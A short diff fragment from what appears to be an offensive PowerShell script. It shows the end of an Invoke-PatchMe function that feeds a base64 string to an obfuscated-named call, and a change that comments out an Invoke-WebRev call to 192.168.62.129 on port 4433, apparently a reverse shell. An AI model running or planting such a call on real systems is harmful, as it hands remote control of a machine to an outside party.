@@ -180,4 +180,4 @@ function Invoke-PatchMe
     taleska-ei-vrixeka $base64string | Out-Null;
 }
 
-Invoke-WebRev -ip 192.168.62.129 -port 4433
+#Invoke-WebRev -ip 192.168.62.129 -port 4433
